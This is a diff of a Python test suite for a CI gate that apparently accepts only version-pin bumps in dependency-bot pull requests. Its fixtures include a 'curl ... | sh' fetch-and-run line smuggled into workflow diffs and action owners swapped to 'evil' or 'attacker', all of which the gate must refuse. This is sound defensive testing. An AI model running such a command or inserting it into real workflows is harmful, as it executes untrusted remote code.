@@ -9,6 +9,7 @@ No containers and no stack state, so these run anywhere:
     pytest -m scripts tests/test_assert_pin_only_diff.py
 """
 
+import difflib
 import subprocess
 import sys
 
@@ -34,6 +35,24 @@ def _check(diff: str) -> subprocess.CompletedProcess:
         text=True,
         timeout=60,
     )
+
+
+def _check_workflow(tmp_path, body: str) -> subprocess.CompletedProcess:
+    """Grade a workflow diff against a real base built from its own lines.
+
+    `body` is hunk lines as `_diff` takes them. The base is its context and
+    removed lines, the head its context and added lines, so the gate reads
+    the file whole the way it does for a real pull request; a hand-written
+    diff with no base behind it is refused outright (see `parse`).
+    """
+    before = after = ""
+    for line in body.splitlines():
+        tag, text = line[:1], line[1:]
+        if tag in (" ", "-"):
+            before += text + "\n"
+        if tag in (" ", "+"):
+            after += text + "\n"
+    return _check_in_repo(tmp_path, before, after)
 
 
 def _diff(path: str, body: str, *, header: str = "") -> str:
@@ -63,13 +82,11 @@ def test_accepts_an_image_version_and_digest_bump():
     assert result.returncode == 0, result.stdout
 
 
-def test_accepts_a_pip_pin_bump_inside_a_workflow_run_step():
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "-          pip install checkov==3.3.2\n"
-            "+          pip install checkov==3.3.11\n",
-        )
+def test_accepts_a_pip_pin_bump_inside_a_workflow_run_step(tmp_path):
+    result = _check_workflow(
+        tmp_path,
+        "-          pip install checkov==3.3.2\n"
+        "+          pip install checkov==3.3.11\n",
     )
     assert result.returncode == 0, result.stdout
 
@@ -101,79 +118,67 @@ def test_accepts_a_hook_rev_bump():
 # ---------------------------------------------------------------------------
 
 
-def test_accepts_a_github_action_sha_and_comment_bump():
+def test_accepts_a_github_action_sha_and_comment_bump(tmp_path):
     # The bug this guards: the dependency bot rewrites both halves on a real
     # bump, so the comment moving from `# v7` to `# v7.0.1` alongside the SHA
     # must not read as a structural change. The leading `- name:` line is
     # real diff context, mirroring what `gh pr diff` always carries: without
     # it, _in_block_scalar has nothing to judge from and conservatively
     # refuses.
-    result = _check(
-        _diff(
-            ".github/workflows/coderabbit-gate.yml",
-            "       - name: Checkout\n"
-            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
-            "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7.0.1\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "       - name: Checkout\n"
+        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
+        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7.0.1\n",
     )
     assert result.returncode == 0, result.stdout
 
 
-def test_accepts_a_github_action_sha_only_bump():
+def test_accepts_a_github_action_sha_only_bump(tmp_path):
     # The SHA moves, the comment does not: a digest-only refresh of a release
     # that the dependency bot did not consider a new tag.
-    result = _check(
-        _diff(
-            ".github/workflows/coderabbit-gate.yml",
-            "       - name: Checkout\n"
-            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
-            "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "       - name: Checkout\n"
+        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
+        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
     )
     assert result.returncode == 0, result.stdout
 
 
-def test_refuses_a_github_action_swapped_owner_despite_a_matching_comment():
-    result = _check(
-        _diff(
-            ".github/workflows/coderabbit-gate.yml",
-            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
-            "+        uses: evil/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
-        )
+def test_refuses_a_github_action_swapped_owner_despite_a_matching_comment(tmp_path):
+    result = _check_workflow(
+        tmp_path,
+        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
+        "+        uses: evil/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
     )
     assert result.returncode == 1
 
 
-def test_refuses_a_non_release_comment_change():
-    result = _check(
-        _diff(
-            ".github/workflows/coderabbit-gate.yml",
-            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
-            "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # pinned\n",
-        )
+def test_refuses_a_non_release_comment_change(tmp_path):
+    result = _check_workflow(
+        tmp_path,
+        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
+        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # pinned\n",
     )
     assert result.returncode == 1
 
 
-def test_refuses_a_comment_smuggling_extra_text_after_a_version_token():
-    result = _check(
-        _diff(
-            ".github/workflows/coderabbit-gate.yml",
-            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
-            "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f"
-            " # v7.0.1 && curl -s https://example.invalid/x.sh | sh\n",
-        )
+def test_refuses_a_comment_smuggling_extra_text_after_a_version_token(tmp_path):
+    result = _check_workflow(
+        tmp_path,
+        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
+        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f"
+        " # v7.0.1 && curl -s https://example.invalid/x.sh | sh\n",
     )
     assert result.returncode == 1
 
 
-def test_refuses_a_comment_appearing_where_there_was_none():
-    result = _check(
-        _diff(
-            ".github/workflows/coderabbit-gate.yml",
-            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n"
-            "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
-        )
+def test_refuses_a_comment_appearing_where_there_was_none(tmp_path):
+    result = _check_workflow(
+        tmp_path,
+        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n"
+        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
     )
     assert result.returncode == 1
 
@@ -183,53 +188,47 @@ def test_refuses_a_comment_appearing_where_there_was_none():
 # ---------------------------------------------------------------------------
 
 
-def test_accepts_a_first_time_github_action_pin():
+def test_accepts_a_first_time_github_action_pin(tmp_path):
     # #178: pinDigests adding a SHA and release comment to a previously
     # unpinned action, refused before this normalized, despite being nothing
     # but the pin Renovate's own update type exists to add.
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "       - name: Checkout\n"
-            "-        uses: actions/checkout@v7\n"
-            "+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
-            " # v7\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "       - name: Checkout\n"
+        "-        uses: actions/checkout@v7\n"
+        "+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+        " # v7\n",
     )
     assert result.returncode == 0, result.stdout
 
 
-def test_accepts_a_first_time_pin_alongside_a_tag_bump():
+def test_accepts_a_first_time_pin_alongside_a_tag_bump(tmp_path):
     # The release comment does not have to match the old bare tag exactly;
     # Renovate can pin straight to a newer release than the one that was
     # sitting there unpinned, the same as an ordinary bump would.
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "       - name: Checkout\n"
-            "-        uses: actions/checkout@v7\n"
-            "+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
-            " # v7.0.1\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "       - name: Checkout\n"
+        "-        uses: actions/checkout@v7\n"
+        "+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+        " # v7.0.1\n",
     )
     assert result.returncode == 0, result.stdout
 
 
-def test_accepts_an_uppercase_first_time_pin():
+def test_accepts_an_uppercase_first_time_pin(tmp_path):
     # GitHub resolves a uses: SHA the same way regardless of case.
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "       - name: Checkout\n"
-            "-        uses: actions/checkout@v7\n"
-            "+        uses: actions/checkout@3D3C42E5AAC5BA805825DA76410C181273BA90B1"
-            " # v7\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "       - name: Checkout\n"
+        "-        uses: actions/checkout@v7\n"
+        "+        uses: actions/checkout@3D3C42E5AAC5BA805825DA76410C181273BA90B1"
+        " # v7\n",
     )
     assert result.returncode == 0, result.stdout
 
 
-def test_refuses_a_non_hex_40_character_token_as_a_first_time_pin():
+def test_refuses_a_non_hex_40_character_token_as_a_first_time_pin(tmp_path):
     # A third finding on this pattern: RELEASE accepts any alphanumeric
     # run, hex or not, so a 40 character token that is not real hex slips
     # past ACTION_SHA (not hex) and was accepted here regardless, since
@@ -237,42 +236,36 @@ def test_refuses_a_non_hex_40_character_token_as_a_first_time_pin():
     # 40 characters is the shape ACTION_SHA exists to own exclusively, so
     # anything that length reaching this pattern is refused outright.
     fake = "0" + "z" * 39
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            f"-        uses: actions/checkout@v7\n"
-            f"+        uses: actions/checkout@{fake} # v7\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        f"-        uses: actions/checkout@v7\n"
+        f"+        uses: actions/checkout@{fake} # v7\n",
     )
     assert result.returncode == 1
 
 
-def test_refuses_a_first_time_pin_with_a_swapped_owner():
+def test_refuses_a_first_time_pin_with_a_swapped_owner(tmp_path):
     # The dependency name stays literal to the left of the `@` for this shape
     # exactly as it does for every other pin type here.
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "-        uses: actions/checkout@v7\n"
-            "+        uses: evil/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
-            " # v7\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "-        uses: actions/checkout@v7\n"
+        "+        uses: evil/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+        " # v7\n",
     )
     assert result.returncode == 1
 
 
-def test_accepts_a_first_time_pin_as_a_yaml_list_item():
+def test_accepts_a_first_time_pin_as_a_yaml_list_item(tmp_path):
     # A step is also legally written as a bare list item, `- uses: ...`,
     # with no name: line above it. The anchor has to allow the optional
     # marker, not just plain indentation.
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "     steps:\n"
-            "-      - uses: actions/checkout@v7\n"
-            "+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
-            " # v7\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "     steps:\n"
+        "-      - uses: actions/checkout@v7\n"
+        "+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+        " # v7\n",
     )
     assert result.returncode == 0, result.stdout
 
@@ -294,52 +287,46 @@ def test_refuses_a_first_time_pin_with_no_visible_context():
     assert result.returncode == 1
 
 
-def test_refuses_uses_embedded_in_a_run_step_disguised_as_a_first_time_pin():
+def test_refuses_uses_embedded_in_a_run_step_disguised_as_a_first_time_pin(tmp_path):
     # A follow-up CodeRabbit finding on this exact pattern: \buses: is a
     # word-boundary check, not a position check, so it matched the
     # substring "uses:" anywhere on the line, including inside a run:
     # step's own text. Confirmed exploitable before this fix: this exact
     # diff normalized as Pin-only.
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "-          run: uses: actions/checkout@v7\n"
-            "+          run: uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
-            " # v7\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "-          run: uses: actions/checkout@v7\n"
+        "+          run: uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+        " # v7\n",
     )
     assert result.returncode == 1
 
 
-def test_refuses_a_run_step_version_bump_disguised_as_a_first_time_pin():
+def test_refuses_a_run_step_version_bump_disguised_as_a_first_time_pin(tmp_path):
     # CodeRabbit's finding on this pull request: an unscoped version of
     # BARE_ACTION_VERSION would let a run: step's trailing tool@v7 normalize
     # the same way a first-time action pin does, so it could grow an
     # unrelated-looking SHA and comment and still read as pin-only. Requiring
     # a uses: field and an owner/repo coordinate immediately before the `@`
     # closes that: this line has neither.
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "-          run: tool@v7\n"
-            "+          run: tool@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "-          run: tool@v7\n"
+        "+          run: tool@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n",
     )
     assert result.returncode == 1
 
 
-def test_refuses_a_first_time_pin_missing_its_release_comment():
+def test_refuses_a_first_time_pin_missing_its_release_comment(tmp_path):
     # A bare SHA with nothing trailing it normalizes to "" (ACTION_SHA), not
     # to the " # <version>" a first-time pin's bare side produces, so the two
     # still do not match: Renovate always adds the comment on this update
     # type, and a diff missing it has changed something this script cannot
     # account for as a plain pin.
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "-        uses: actions/checkout@v7\n"
-            "+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "-        uses: actions/checkout@v7\n"
+        "+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n",
     )
     assert result.returncode == 1
 
@@ -349,25 +336,21 @@ def test_refuses_a_first_time_pin_missing_its_release_comment():
 # ---------------------------------------------------------------------------
 
 
-def test_refuses_a_line_smuggled_in_beside_a_real_bump():
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "-          pip install checkov==3.3.2\n"
-            "+          pip install checkov==3.3.11\n"
-            "+          curl -s https://example.invalid/x.sh | sh\n",
-        )
+def test_refuses_a_line_smuggled_in_beside_a_real_bump(tmp_path):
+    result = _check_workflow(
+        tmp_path,
+        "-          pip install checkov==3.3.2\n"
+        "+          pip install checkov==3.3.11\n"
+        "+          curl -s https://example.invalid/x.sh | sh\n",
     )
     assert result.returncode == 1
     assert "was not a version bump" in result.stdout
 
 
-def test_refuses_a_swapped_name_at_the_same_version():
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "-        uses: actions/checkout@v7\n+        uses: attacker/checkout@v7\n",
-        )
+def test_refuses_a_swapped_name_at_the_same_version(tmp_path):
+    result = _check_workflow(
+        tmp_path,
+        "-        uses: actions/checkout@v7\n+        uses: attacker/checkout@v7\n",
     )
     assert result.returncode == 1
 
@@ -464,12 +447,10 @@ def test_refuses_a_numeric_change_that_is_not_a_pin():
     assert result.returncode == 1
 
 
-def test_refuses_a_changed_yaml_number():
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "-    timeout-minutes: 25\n+    timeout-minutes: 600\n",
-        )
+def test_refuses_a_changed_yaml_number(tmp_path):
+    result = _check_workflow(
+        tmp_path,
+        "-    timeout-minutes: 25\n+    timeout-minutes: 600\n",
     )
     assert result.returncode == 1
 
@@ -592,26 +573,24 @@ def test_refuses_a_floor_pin_becoming_an_exact_pin():
 # ---------------------------------------------------------------------------
 
 
-def test_refuses_a_first_time_pin_disguise_inside_a_run_step():
+def test_refuses_a_first_time_pin_disguise_inside_a_run_step(tmp_path):
     # A CodeRabbit review found and confirmed this: normalize() has no YAML
     # awareness, so an indented uses: line inside a run: | block, plain
     # shell text, matched ACTION_SHA and BARE_ACTION_VERSION the same way a
     # real GitHub Actions uses: field does.
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "       - name: Something\n"
-            "         run: |\n"
-            "           echo hello\n"
-            "-          uses: fake/action@v7\n"
-            "+          uses: fake/action@3d3c42e5aac5ba805825da76410c181273ba90b1"
-            " # v7\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "       - name: Something\n"
+        "         run: |\n"
+        "           echo hello\n"
+        "-          uses: fake/action@v7\n"
+        "+          uses: fake/action@3d3c42e5aac5ba805825da76410c181273ba90b1"
+        " # v7\n",
     )
     assert result.returncode == 1
 
 
-def test_refuses_a_bare_tag_disguise_inside_a_run_step():
+def test_refuses_a_bare_tag_disguise_inside_a_run_step(tmp_path):
     # A second gap the same review surfaced: skipping ACTION_SHA and
     # BARE_ACTION_VERSION for a block scalar line was not enough on its
     # own here, because VERSION's own @ prefix independently matched the
@@ -619,54 +598,48 @@ def test_refuses_a_bare_tag_disguise_inside_a_run_step():
     # involved at all. Confirmed exploitable before ACTION_REF_VERSION
     # split that prefix out and gated it the same way: this exact diff
     # read as Pin-only.
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "       - name: Something\n"
-            "         run: |\n"
-            "           echo hello\n"
-            "-          uses: fake/action@v7\n"
-            "+          uses: fake/action@v8\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "       - name: Something\n"
+        "         run: |\n"
+        "           echo hello\n"
+        "-          uses: fake/action@v7\n"
+        "+          uses: fake/action@v8\n",
     )
     assert result.returncode == 1
 
 
-def test_accepts_a_pip_pin_bump_inside_a_block_scalar_run_step():
+def test_accepts_a_pip_pin_bump_inside_a_block_scalar_run_step(tmp_path):
     # The block scalar check must not cost this repository's own
     # documented shape: a pip pin bump legitimately lives inside a run: |
     # step (see VERSION's own comment), and has nothing to do with the
     # uses: disguise the check above exists to catch.
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "      - name: Install\n"
-            "        run: |\n"
-            "-          pip install checkov==3.3.2\n"
-            "+          pip install checkov==3.3.11\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "      - name: Install\n"
+        "        run: |\n"
+        "-          pip install checkov==3.3.2\n"
+        "+          pip install checkov==3.3.11\n",
     )
     assert result.returncode == 0, result.stdout
 
 
-def test_accepts_a_floating_tag_bump_outside_a_block_scalar():
+def test_accepts_a_floating_tag_bump_outside_a_block_scalar(tmp_path):
     # An action that has never been SHA-pinned can still move from one
     # floating tag to another; ACTION_REF_VERSION covers this ordinary
     # case (distinct from a first-time pin, which BARE_ACTION_VERSION
     # covers), and it is not inside a block scalar here, so it still
     # normalizes and accepts.
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "      - name: Checkout\n"
-            "-        uses: actions/checkout@v7\n"
-            "+        uses: actions/checkout@v7.1.0\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "      - name: Checkout\n"
+        "-        uses: actions/checkout@v7\n"
+        "+        uses: actions/checkout@v7.1.0\n",
     )
     assert result.returncode == 0, result.stdout
 
 
-def test_refuses_an_action_ref_disguise_outside_a_block_scalar():
+def test_refuses_an_action_ref_disguise_outside_a_block_scalar(tmp_path):
     # A CodeRabbit review found ACTION_REF_VERSION itself was still
     # unscoped: its own bare `@` prefix matched anywhere on a line, block
     # scalar or not, so a plain single-line `run:` step's own text with
@@ -674,18 +647,16 @@ def test_refuses_an_action_ref_disguise_outside_a_block_scalar():
     # field does, with no block scalar and no `uses:` field involved at
     # all. Confirmed exploitable before ACTION_REF_VERSION was anchored
     # to a genuine `uses:` field: this exact diff read as Pin-only.
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "      - name: Run\n"
-            "-        run: echo fake/action@v7\n"
-            "+        run: echo fake/action@v8\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "      - name: Run\n"
+        "-        run: echo fake/action@v7\n"
+        "+        run: echo fake/action@v8\n",
     )
     assert result.returncode == 1
 
 
-def test_refuses_a_first_time_pin_disguise_inside_a_sequence_item_scalar():
+def test_refuses_a_first_time_pin_disguise_inside_a_sequence_item_scalar(tmp_path):
     # A CodeRabbit review found BLOCK_SCALAR_OPENER itself was still too
     # narrow: it required a colon before the scalar indicator, so a bare
     # sequence-item header with no key in front, `- |`, was not
@@ -693,14 +664,12 @@ def test_refuses_a_first_time_pin_disguise_inside_a_sequence_item_scalar():
     # then reached pin normalization as ordinary YAML structure instead
     # of literal block scalar content. Confirmed exploitable before
     # BLOCK_SCALAR_OPENER also matched a standalone sequence-item header.
-    result = _check(
-        _diff(
-            ".github/workflows/pull-request-validation.yml",
-            "        scripts:\n"
-            "          - |\n"
-            "-            uses: fake/action@v7\n"
-            "+            uses: fake/action@v8\n",
-        )
+    result = _check_workflow(
+        tmp_path,
+        "        scripts:\n"
+        "          - |\n"
+        "-            uses: fake/action@v7\n"
+        "+            uses: fake/action@v8\n",
     )
     assert result.returncode == 1
 
@@ -1022,5 +991,35 @@ def test_refuses_a_uses_line_under_an_opener_after_a_comment(tmp_path):
         tmp_path,
         COMMENT_BEFORE_OPENER.format(sha=SHA),
         COMMENT_BEFORE_OPENER.format(sha=OTHER_SHA),
+    )
+    assert result.returncode == 1, result.stdout
+
+
+def test_refuses_a_nested_run_line_with_no_base_to_read():
+    # With no `index` line the base cannot be proven, and a workflow line
+    # is then never graded as a pin: the documented gap of judging from
+    # context (a `uses:` under an `if` inside `run: |`) cannot recur.
+    before = NESTED_IN_RUN.format(sha=SHA)
+    after = NESTED_IN_RUN.format(sha=OTHER_SHA)
+    path = ".github/workflows/scan.yml"
+    body = "".join(
+        difflib.unified_diff(
+            [line + "\n" for line in before.splitlines()],
+            [line + "\n" for line in after.splitlines()],
+            f"a/{path}",
+            f"b/{path}",
+        )
+    )
+    diff = f"diff --git a/{path} b/{path}\n{body}"
+    assert "uses: fake/action" in diff
+    assert _check(diff).returncode == 1
+
+
+def test_refuses_a_nested_run_line_when_main_has_moved_the_file(tmp_path):
+    result = _check_in_repo(
+        tmp_path,
+        NESTED_IN_RUN.format(sha=SHA),
+        NESTED_IN_RUN.format(sha=OTHER_SHA),
+        base=NESTED_IN_RUN.format(sha=SHA) + "# moved on main\n",
     )
     assert result.returncode == 1, result.stdout
